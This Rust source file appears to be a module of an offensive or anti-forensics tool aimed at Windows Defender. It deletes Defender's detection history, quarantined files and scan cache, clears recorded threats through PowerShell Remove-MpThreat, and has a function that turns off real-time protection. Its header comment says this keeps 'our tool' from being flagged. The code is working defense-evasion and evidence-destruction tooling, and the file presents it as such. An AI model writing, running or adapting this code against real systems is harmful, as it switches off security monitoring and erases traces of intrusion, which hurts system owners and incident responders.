#![cfg(target_os = "windows")]
/*
 * defender.rs — Windows Defender artifact removal
 *
 * Key paths:
 *   C:\ProgramData\Microsoft\Windows Defender\Scans\History\    — detection history
 *   C:\ProgramData\Microsoft\Windows Defender\Quarantine\       — quarantined files
 *   C:\ProgramData\Microsoft\Windows Defender\Scans\mpcache-*   — scan metadata
 *
 * We also disable Defender real-time protection to avoid our tool being
 * flagged during execution (requires admin + policy not enforced by Intune).
 *
 * Detection history wipe can also be done via:
 *   Remove-MpThreat (PowerShell)  — WMI MSFT_MpThreat class
 */

use std::fs;
use std::process::Command;
use walkdir::WalkDir;

#[derive(Debug, Default)]
pub struct DefenderStats {
    pub history_files_deleted: u32,
    pub quarantine_cleared:    u32,
    pub bytes_freed:           u64,
    pub errors:                u32,
}

fn delete_dir_contents(dir: &str, stats: &mut DefenderStats) {
    if !std::path::Path::new(dir).exists() { return; }

    for entry in WalkDir::new(dir).follow_links(false).into_iter().flatten() {
        if !entry.file_type().is_file() { continue; }
        let path = entry.path().to_str().unwrap_or("");
        if let Ok(meta) = fs::metadata(path) { stats.bytes_freed += meta.len(); }
        match fs::remove_file(path) {
            Ok(()) => { stats.history_files_deleted += 1; }
            Err(e) => { eprintln!("[!] defender: remove {}: {}", path, e); stats.errors += 1; }
        }
    }
}

/// Try to disable real-time protection via PowerShell Set-MpPreference.
pub fn disable_realtime_protection() -> bool {
    Command::new("powershell")
        .args(["-NonInteractive", "-Command",
               "Set-MpPreference -DisableRealtimeMonitoring $true"])
        .status()
        .map(|s| s.success())
        .unwrap_or(false)
}

/// Remove all threat detections via WMI.
pub fn remove_mp_threats() -> bool {
    Command::new("powershell")
        .args(["-NonInteractive", "-Command",
               "Remove-MpThreat"])
        .status()
        .map(|s| s.success())
        .unwrap_or(false)
}

pub fn wipe_defender_artifacts(verbose: bool) -> DefenderStats {
    let mut stats = DefenderStats::default();

    let base = r"C:\ProgramData\Microsoft\Windows Defender";

    let history_dir    = format!(r"{}\Scans\History",     base);
    let quarantine_dir = format!(r"{}\Quarantine",         base);
    let scan_meta      = format!(r"{}\Scans",              base);

    eprintln!("[*] defender: clearing detection history...");
    delete_dir_contents(&history_dir, &mut stats);

    eprintln!("[*] defender: clearing quarantine...");
    let pre = stats.history_files_deleted;
    delete_dir_contents(&quarantine_dir, &mut stats);
    stats.quarantine_cleared = stats.history_files_deleted - pre;

    // mpcache-*.tmp files in Scans/
    for entry in walkdir::WalkDir::new(&scan_meta)
        .max_depth(1).into_iter().flatten()
    {
        let path = entry.path().to_str().unwrap_or("");
        if path.contains("mpcache-") {
            if let Ok(meta) = fs::metadata(path) { stats.bytes_freed += meta.len(); }
            let _ = fs::remove_file(path);
        }
    }

    // WMI threat removal
    if remove_mp_threats() {
        eprintln!("[+] defender: Remove-MpThreat OK");
    }

    if verbose {
        eprintln!("[+] defender: {} file(s) deleted, {} quarantine item(s), {} KiB freed",
            stats.history_files_deleted, stats.quarantine_cleared, stats.bytes_freed >> 10);
    }
    stats
}
